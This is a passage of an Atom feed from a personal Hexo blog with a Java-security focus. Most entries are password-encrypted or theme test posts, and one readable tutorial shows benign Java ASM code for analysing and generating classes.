<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>H4ckbird&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/51a9f82d05f49451e3509af2b4abe068</icon>
  <subtitle>欲速则不达</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-21T12:31:01.488Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>H4ckbird</name>
    <email>stupidbird6379@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JavaSec</title>
    <link href="http://example.com/2022/11/21/JavaSec/"/>
    <id>http://example.com/2022/11/21/JavaSec/</id>
    <published>2022-11-21T12:29:53.000Z</published>
    <updated>2022-11-21T12:31:01.488Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="323fef4b6167a2193f2a9c41da67b3ec589089abd9929d0dc764a48bfb82c234">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7dc240770bb65efcf40282cb335336366056f1aecead61d7dad29a73b32810672f574192d3d13cb2a8444a6527d1660f31db106d643e00f8ea7e47e3d934aa09a7f5d1d6eee1f7c294059a33a7ef75553329d2d3113ca6154d07cc43b7d66387bebac79eaa533c40fffd25c3c8c1a3db89e809aae83b4b3ca713bf12c5fe6f865d3f0e104ad6de3decc6743f33803326e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java安全资料分享</summary>
    
    
    
    
    <category term="Java security" scheme="http://example.com/tags/Java-security/"/>
    
  </entry>
  
  <entry>
    <title>Test-topBanner&amp;&amp;参数释义</title>
    <link href="http://example.com/2022/11/21/Test-topBanner/"/>
    <id>http://example.com/2022/11/21/Test-topBanner/</id>
    <published>2022-11-21T02:02:52.000Z</published>
    <updated>2022-11-21T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="deb1bcb7f4783a6c3e9720238cf8cc98b6145a0fb1c438db1158f4300aeef5cf">2b3406d62b6174fb947463ad5f2bb2d06e57c7d91e707796abde320f4893dbc6ecbb4fc0e40fc88c7e3ac29f11bdabfbd7f7a6079a295e4f59ca91061a72c912b082bbb978746b458dabd2ae09d1b9607c30b06eb5fa6a0d770955f76b4de060247ebf9c6b70619631a88284348e2355ee58cc0995f7aba3ccedd8722f166d2189ec7f10362f3583a6b81bcfdcb4cdcbdefc043e4976fb6528a34ba3d5072c6fbe452df3c4b61ade722da2eb6fa73e3ae1b1d35c8b975ac52254704cf8dd641a8a30e703b445eea31222d1d80f0a63c4e9c6909b28efdce76765e55bc572d509e5d57cfd6ca7251233fbe757ff7cf9189a88018e0361ced56c37a6392d1979678d4f5ca089e303c08b587a543fcde7afa67f11a4bd6d001252fe1bd7fcf975c7f5599f691bd2e7b6d33ea1203b6a8a2eebcd2298eff6a2d984666f959a86431a9e6d86d94abdd8d4f86982ee87821be27d0e0b055ccc10c94061bc0e96baf0d76ae5e6483008d3c52fd7037d8e626f446087710672a3175d9cf4e33bf161479372cf772f05b4b90f93ca00d3c70240d5568e0cc66eb11e7bd8fa66f1f176b074724235671dadf855f1a8aab0b96d173cbe0578f3244805a12d1625cd1765af5b4a5a0d39fa080c4f10c2ad2299b264ca5fe6ef74db1e3605b63509cef9348f7b13e7fd744545137af7241d73eebc88d50bdae7c5e3b10fbbc8b8bb5b42a4a6af1b4081a28bdccddcde4a1d79d1c5b87bd5d265ea04ab918cee90f6172ef7e20cd155fd13c6297d78ea645dbc4818ef27ae56d8ca23e34a3d7969f734a31d842ef5d176092e099f8b1b9052826f174d10ecd9afe1f866621ace834d7aae99a9ab6a65a3eb989911be3ef771c655d8f15e4bf214d36e963500bb03f2d88b8740a1cf97b9c5826198be5fce5dbb161d70be85a8fe780730d4619dd9a92e91cd52b10f1164ce80bd132a99e07346bf7753dd4519910476bba72de8e5593cd6f3244f425cc2be03dec67c0e6f379cbfdaddbbdb3a0a034e9d28739b5ef9310ddfe4d9a8aacc53b35bef8704d0c6463825fd6952d9e55df84dc6c6e8879f39a52bb8d43bad8c0ea44182c3f5d87e75f549236feb87ce6b71b63ae95c6d295cdd0bfe69f710b61adce4991ecf4ff6dafb741986a0b51c8937282ed445375e5806b260b1174c6bdf9a318f56f53c26f30be56a918a7a23f6a9a384720c9b15ccdad9e2876cebdda68988cde24bc846b94d0f12b2aa7e9ace3a12e7ac4e9003eb11ccf599e91aa72db3596ef971c9d3eeae12681c8b0236b27e29eac67b1a438a900277e2c2e5d832098a5bd1e0d53ccc48682acffccf8a05b6cb04a032c871d00a596067d0399028ae218a3987def12909c8f03f6deea53ccf4513fffadd43a80e8f7f55956f29e131dc51c4821fbb842e1a9bba6bb4121dc986b49cfb8f5c64d97590cad29f179005ed947fa4bdb9d9fff0071e7324d3e983e64469ac6f2a0ce06a35e1b9c1606e595118081186e0dd77be1649734ecfaf6486d200c937a4f2313fef859d9a53399c796e170b15d38ac5f160270e5779326169738e560cfc7c2ba0aa5a284e0a65ba3c5a2c28032d91e7745e97b72d40d5c5eed6c254426fd668224e95c3d0a6c8efda0a778e9bee5bc2266aac2b48ea2a6572d2e48e0210c1f631ebe53fc3ce285fbdb5a821436abc58b176548cd582a68f2dc58f4b26f408102d896db46ce04f13452cdf3536b25eb7abf84557877559e26f2d8b4e7e709fa779c54302f34cb3ed622797c87997d2ad806d6f12f7745c5843c06f11af7310a0df494db326ed8b2a05d4b8218b89b32c57272d19f14b3eb00d3e8a890673d52754c7c049c9a6b81be2879a6d5a815c3b1c7e8fbc0bb3d24f1ea3d380cc521cb55a647fdf4eb6886346d97c53fd7af2df534614df57f10d37e8181bbdbea7d1849f6c79826164b8bb110d912f694eac197f0d0cbc72c0e4181f822fafd8d4a5e70532ab7723b4f6182f36f965ecace14a140e2235ccf5a35084b589afb34e53088684d7295bd0b4b5f87881a3acd9ab3346584007d83e7be04af624c4ffb970fd0e5600e4f53556139f5867312d888ee6da56183d52d5511b6c643d813a0c5865afc69e05baccce5b67da980eda1d62d460c9067ff0f4d534e598bd13b6e31965dee9669eaa911592622ea5de69740cf368b6d08cc7da4ca49d8aafc7e58b3960035c8d7b91983031046980ee1a243f652eecc025f76c4cd091bda328a2e2a26b45c231b7635e3f988003dad898272451142a76e38f4c631db116630a3c84eb9b80a82c7be65bc4d5d73c0613470757f8684dc33d326fe00ac59608f01351e3a3494743c6db962d57d5079ec881915fc03c19d70c560bc218524c823337282ede507d91b59674311d144a18493a49d709490ec76545f5c3ab6cc99411b05611ab37cfe25db4621a36655ea8164c80eaa9909ad4dc4820a1dbfbd670dbcb3ca97edfe08d038ce17c1edd582e3d298d0023b9fd58120de62fc719142fe396db0bf618b16fb096d727d8197d702181285e81a366ffb01f31dbb3a89e53e5386bd046447a6df11e06b2b9f3be166f05041292d924c1df57e1bd66833ffe10aa88ea1ec51cf91a419cce96296d9525905e1845e74ad818efe9d03e39e4efec45ff1d1e7c04c069117b80fdc49ba29bf3d561cbbe374876535e83961dc7252639d119774ce380043cf69c56461ccc66c856f7b20aebc9e29bee16d4790342443de48bec54701d04788194c0f3e4bc6c32536ffd8596e5d3619eaa76c0a55ac4fc34b82484a5b14a03364829a2c909972910f8a1c463ed9c148d8141f3e3e46f4d0d48fee31bc8682845781c66a70788ae817b7084cbb37d004774438e13542d4c9acf40c4cfe4e8d1b2e950d915119ce3391bf6fce32de053de358fbb12eae17ae51f8ef067f2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">置顶轮番图测试及参数详情解释</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Test-swiper-index</title>
    <link href="http://example.com/2022/11/21/Test-swiper-index/"/>
    <id>http://example.com/2022/11/21/Test-swiper-index/</id>
    <published>2022-11-21T01:22:01.000Z</published>
    <updated>2022-11-21T01:30:26.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试swiper——index"><a href="#测试swiper——index" class="headerlink" title="测试swiper——index"></a>测试swiper——index</h1><h2 id="How-to-discover-your-authentic-self-—-at-any-age"><a href="#How-to-discover-your-authentic-self-—-at-any-age" class="headerlink" title="How to discover your authentic self — at any age"></a>How to discover your authentic self — at any age</h2><p>After more than two decades as an anchor for ABC News, an on-air panic attack sent Dan Harris’s life in a new direction: he became a dedicated meditator and, to some, even a guru. But then an anonymous survey of his family, friends and colleagues turned up some brutal feedback — he was still kind of a jerk. In a wise, funny talk, he shares his years-long quest to improve his relationships with everyone (starting with himself) and explains the science behind loving-kindness medita…</p><h2 id="How-to-break-down-barriers-and-not-accept-limits"><a href="#How-to-break-down-barriers-and-not-accept-limits" class="headerlink" title="How to break down barriers and not accept limits"></a>How to break down barriers and not accept limits</h2><ul><li>firest : I don’t know</li><li>second: You know what i’m saying? damnit!</li></ul>]]></content>
    
    
    <summary type="html">测试一下置顶的美化效果</summary>
    
    
    
    
    <category term="Butterfly主题美化" scheme="http://example.com/tags/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>first-page</title>
    <link href="http://example.com/2022/11/19/first-page/"/>
    <id>http://example.com/2022/11/19/first-page/</id>
    <published>2022-11-19T13:16:05.000Z</published>
    <updated>2022-11-21T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="64d4ff5441eeeaedad0c7bdaef13cff2576367ee5c279c0893827ea455cdb755"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">fist-page肯定是测试用的啦，第一次都是他的。</summary>
    
    
    
    
    <category term="test image" scheme="http://example.com/tags/test-image/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化编码绕过</title>
    <link href="http://example.com/2022/11/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2022/11/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</id>
    <published>2022-11-19T13:16:05.000Z</published>
    <updated>2021-11-20T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7826a7d81c5f1f7804de8a95b0f2b4456e20d4f8125c9de22fc15db22964f0b8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="Java security" scheme="http://example.com/tags/Java-security/"/>
    
  </entry>
  
  <entry>
    <title>asm</title>
    <link href="http://example.com/2022/11/19/asm/"/>
    <id>http://example.com/2022/11/19/asm/</id>
    <published>2022-11-19T12:08:37.664Z</published>
    <updated>2022-11-21T12:14:05.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><h2 id="分析类"><a href="#分析类" class="headerlink" title="分析类"></a>分析类</h2><p>分析类的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitors类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitors</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitors</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> version</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version,<span class="type">int</span> access,String name,String signature,String superName,String[] interfaces)</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;extends &quot;</span> + superName + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visit(version,access,name,signature,superName,interfaces);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 属性变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        System.out.println(desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exceptions</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过asm框架分析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnalysisClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassVisitors</span> <span class="variable">myClassVisitors</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitors</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        classReader.accept(myClassVisitors,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/150936112-ab83838c-4f67-4102-9816-ce2afa734559.png" alt="image-20220125122358358"></p><p><img src="https://user-images.githubusercontent.com/63966847/150936121-914e2c3a-6019-4f01-91ed-38c5453cab39.png" alt="image-20220125122420194"></p><blockquote><p>该部分也是GI的核心。<a href="https://xz.aliyun.com/t/10363">https://xz.aliyun.com/t/10363</a></p></blockquote><h2 id="生成类"><a href="#生成类" class="headerlink" title="生成类"></a>生成类</h2><blockquote><p>感觉用于webshell中。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="comment">// java1.8 public修饰 路径 签名 父类 接口</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC, <span class="string">&quot;com/firebasky/utils/asm/learn/Learn2Test&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//public和static修饰 方法名 描述符 签名 异常</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">render</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC + ACC_STATIC, <span class="string">&quot;render&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//插入一个字段是方法里面插入 操作码 路径 名字 描述符</span></span><br><span class="line">        render.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个ldc</span></span><br><span class="line">        render.visitLdcInsn(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个方法 操作码 路径 方法名 参数 是否为接口的方法</span></span><br><span class="line">        render.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//插入返回值</span></span><br><span class="line">        render.visitInsn(RETURN);</span><br><span class="line">        <span class="comment">//设置栈和局部变量大小</span></span><br><span class="line">        render.visitMaxs(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//结束</span></span><br><span class="line">        render.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn2Test</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="加载或移除类成员"><a href="#加载或移除类成员" class="headerlink" title="加载或移除类成员"></a>加载或移除类成员</h2><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> 